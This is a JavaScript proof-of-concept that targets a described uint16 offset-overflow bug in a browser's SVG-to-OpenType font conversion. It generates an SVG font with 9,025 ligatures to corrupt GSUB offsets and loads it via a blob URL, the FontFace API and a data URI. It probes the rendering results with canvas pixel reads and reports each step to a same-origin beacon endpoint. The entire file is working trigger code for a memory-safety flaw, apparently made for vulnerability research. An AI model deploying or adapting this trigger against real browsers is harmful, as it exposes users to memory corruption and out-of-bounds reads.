// p175 — SVG font GSUB uint16 offset overflow
//
// Bug: SVGToOTFFontConversion.cpp appendLigatureSubtable() writes relative
// offsets via overwrite16() which truncate to uint16 when subtable > 65535 bytes.
// Additional bug: line 761 resets previousFirstGlyph to [0] instead of [i],
// creating 8000+ single-entry segments instead of ~95 grouped segments.
// Result: corrupted OTF offsets cause FreeType to read wrong locations.
//
// Beacon prefix: V175-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag, body) {
    queue.push({tag: tag, body: body || ''});
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var item = queue.shift();
    try {
      var x = new XMLHttpRequest();
      if (item.body) {
        x.open('POST', BASE + '/beacon/V175-' + item.tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(item.body);
      } else {
        x.open('GET', BASE + '/beacon/V175-' + item.tag + '?t=' + Date.now(), true);
        x.send();
      }
      x.onloadend = function() { setTimeout(drain, 10); };
      x.onerror = function() { setTimeout(drain, 10); };
    } catch(e) { setTimeout(drain, 10); }
  }

  B('BOOT');

  // Phase 1: Build SVG font with enough ligatures to overflow GSUB offsets
  // Need >65536 bytes in ligature subtable
  // Each 2-char ligature = ~8 bytes in GSUB LigatureSet
  // 95 base chars × 95 = 9025 ligature pairs = ~72KB > 65KB overflow
  var BASE_START = 0x41; // 'A'
  var BASE_COUNT = 95;
  var t0 = Date.now();

  var parts = [];
  parts.push('<?xml version="1.0" standalone="yes"?>');
  parts.push('<svg xmlns="http://www.w3.org/2000/svg">');
  parts.push('<defs>');
  parts.push('<font id="OvfFont" horiz-adv-x="500">');
  parts.push('<font-face font-family="GsubOvf" units-per-em="1000" ascent="800" descent="-200"/>');
  parts.push('<missing-glyph horiz-adv-x="500" d="M50 0V800H450V0H50Z"/>');

  // Base glyphs: 95 characters (A-~)
  for (var i = 0; i < BASE_COUNT; i++) {
    var ch = String.fromCharCode(BASE_START + i);
    // Each glyph has a unique path so they render differently
    var y = (i % 8) * 100;
    parts.push('<glyph unicode="' + ch + '" horiz-adv-x="500" d="M50 ' + y + 'L450 ' + y + 'L450 ' + (y + 100) + 'L50 ' + (y + 100) + 'Z"/>');
  }

  // Ligature glyphs: all 2-char combinations = 9025 ligatures
  var ligCount = 0;
  for (var a = 0; a < BASE_COUNT; a++) {
    for (var b = 0; b < BASE_COUNT; b++) {
      var c1 = String.fromCharCode(BASE_START + a);
      var c2 = String.fromCharCode(BASE_START + b);
      // Each ligature has a wider glyph (800 vs 500) with a unique y-offset pattern
      var ly = ((a * BASE_COUNT + b) % 16) * 50;
      parts.push('<glyph unicode="' + c1 + c2 + '" horiz-adv-x="800" d="M0 ' + ly + 'L800 ' + ly + 'L800 ' + (ly + 50) + 'L0 ' + (ly + 50) + 'Z"/>');
      ligCount++;
    }
  }

  parts.push('</font>');
  parts.push('</defs>');
  parts.push('</svg>');

  var svgText = parts.join('\n');
  var buildMs = Date.now() - t0;
  B('BUILT-' + ligCount + 'lig-' + svgText.length + 'B-' + buildMs + 'ms');

  // Phase 2: Try loading via @font-face with format("svg")
  var style = document.createElement('style');
  var blob = new Blob([svgText], { type: 'image/svg+xml' });
  var blobUrl = URL.createObjectURL(blob);
  style.textContent = '@font-face { font-family: "GsubOvf"; src: url("' + blobUrl + '") format("svg"); }';
  document.head.appendChild(style);
  B('STYLE-ADDED');

  // Phase 3: Render and check - delay for font loading
  setTimeout(function() {
    // Create test spans with different text content
    var span1 = document.createElement('span');
    span1.style.fontFamily = '"GsubOvf", monospace';
    span1.style.fontSize = '48px';
    span1.textContent = 'ABCDEF';
    document.body.appendChild(span1);

    var span2 = document.createElement('span');
    span2.style.fontFamily = '"GsubOvf", monospace';
    span2.style.fontSize = '48px';
    // Ligature pairs - if font loaded, these render as single wider glyphs
    span2.textContent = 'AB CD EF';
    document.body.appendChild(span2);

    setTimeout(function() {
      var w1 = span1.offsetWidth;
      var w2 = span2.offsetWidth;
      // If SVG font loaded: base glyphs = 500 units, ligatures = 800 units
      // If fallback monospace: all chars same width
      B('WIDTH1-' + w1 + '-WIDTH2-' + w2);

      var fontLoaded = w1 !== w2 || w1 > 200;
      B('FONT-' + (fontLoaded ? 'LOADED' : 'FALLBACK'));

      // Phase 4: Canvas rendering to detect corrupted glyph output
      try {
        var c = document.createElement('canvas');
        c.width = 1200; c.height = 100;
        var ctx = c.getContext('2d');

        // Render with SVG font
        ctx.font = '48px "GsubOvf"';
        ctx.fillStyle = '#000';
        ctx.fillText('ABCDEFGHIJ', 10, 60);

        // Read pixels
        var imgData = ctx.getImageData(0, 0, 1200, 100);
        var px = imgData.data;
        var nonZero = 0;
        var colSums = [];
        for (var col = 0; col < 1200; col++) {
          var colSum = 0;
          for (var row = 0; row < 100; row++) {
            var idx = (row * 1200 + col) * 4;
            if (px[idx + 3] > 0) {
              nonZero++;
              colSum += px[idx + 3];
            }
          }
          if (col % 60 === 0) colSums.push(col + ':' + colSum);
        }
        B('CANVAS-PX-' + nonZero);
        B('COL-SUMS', colSums.join(' '));

        // Phase 5: Render ligature text on canvas
        ctx.clearRect(0, 0, 1200, 100);
        ctx.font = '48px "GsubOvf"';
        ctx.fillText('AABB CCDD EEFF', 10, 60);
        var imgData2 = ctx.getImageData(0, 0, 1200, 100);
        var px2 = imgData2.data;
        var nonZero2 = 0;
        for (var p = 0; p < px2.length; p += 4) {
          if (px2[p + 3] > 0) nonZero2++;
        }
        B('CANVAS2-PX-' + nonZero2);

        // Compare widths: if GSUB corruption happened, ligature rendering
        // may produce different pixel patterns than expected
        var w = ctx.measureText('AABB').width;
        var wSingle = ctx.measureText('ABCD').width;
        B('MEASURE-LIG-' + Math.round(w) + '-SINGLE-' + Math.round(wSingle));

      } catch(e) {
        B('CANVAS-ERR-' + e.message.substring(0, 40));
      }

      // Phase 6: Also try FontFace API path
      try {
        var blob2 = new Blob([svgText], { type: 'image/svg+xml' });
        var url2 = URL.createObjectURL(blob2);
        var face = new FontFace('GsubOvf2', 'url(' + url2 + ') format("svg")');
        face.load().then(function(loaded) {
          B('FONTFACE-LOADED');
          document.fonts.add(loaded);
          // Test with a new canvas
          var c2 = document.createElement('canvas');
          c2.width = 800; c2.height = 60;
          var ctx2 = c2.getContext('2d');
          ctx2.font = '48px GsubOvf2';
          ctx2.fillText('AAABBBCCC', 10, 50);
          var px3 = ctx2.getImageData(0, 0, 800, 60).data;
          var nz3 = 0;
          for (var p = 0; p < px3.length; p += 4) if (px3[p+3] > 0) nz3++;
          B('FONTFACE-CANVAS-PX-' + nz3);
        }).catch(function(e) {
          B('FONTFACE-ERR-' + e.name + '-' + String(e.message).substring(0, 40));
        });
      } catch(e) {
        B('FONTFACE-API-ERR-' + e.message.substring(0, 30));
      }

      // Phase 7: Try data URI approach (bypasses CORS, different code path)
      try {
        var b64 = btoa(svgText);
        var style2 = document.createElement('style');
        style2.textContent = '@font-face { font-family: "GsubOvf3"; src: url("data:image/svg+xml;base64,' + b64 + '") format("svg"); }';
        document.head.appendChild(style2);
        B('DATAURI-ADDED-' + b64.length + 'B');

        setTimeout(function() {
          var span3 = document.createElement('span');
          span3.style.fontFamily = '"GsubOvf3", monospace';
          span3.style.fontSize = '48px';
          span3.textContent = 'ABCDEFGHIJ';
          document.body.appendChild(span3);

          setTimeout(function() {
            B('DATAURI-WIDTH-' + span3.offsetWidth);

            var c3 = document.createElement('canvas');
            c3.width = 800; c3.height = 60;
            var ctx3 = c3.getContext('2d');
            ctx3.font = '48px "GsubOvf3"';
            ctx3.fillText('AABB', 10, 50);
            var px4 = ctx3.getImageData(0, 0, 800, 60).data;
            var nz4 = 0;
            for (var p = 0; p < px4.length; p += 4) if (px4[p+3] > 0) nz4++;
            B('DATAURI-CANVAS-PX-' + nz4);
            B('DONE');
          }, 1000);
        }, 500);
      } catch(e) {
        B('DATAURI-ERR-' + e.message.substring(0, 30));
      }

    }, 1500);
  }, 2000);
})();
